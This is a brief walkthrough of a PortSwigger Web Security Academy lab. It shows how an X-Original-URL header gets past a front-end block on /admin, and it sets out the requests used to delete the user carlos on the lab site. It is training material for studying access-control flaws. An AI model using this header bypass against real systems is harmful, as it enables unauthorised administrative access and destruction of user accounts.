https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented

This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.

To solve the lab, access the admin panel and delete the user carlos.


1) try to access to /admin but we are blocked by the website

2) now if we change the get request adding
    X-Original-URL: randomstuff

    then we obtain NOT FOUND

3) but if we use 
    GET https://0ada00c803324c938094d05d00e30084.web-security-academy.net/  with
    
    X-Original-URL: /admin
    
    then we can access to the admin page without problem 

4) from this page we can see that the endpoint to delete users is /admin/delete?username=<USERNAME>

5) chaneg the method to POST and use
    POST https://0ada00c803324c938094d05d00e30084.web-security-academy.net/?username=carlos

    and
    
    X-Original-URL: /admin/delete
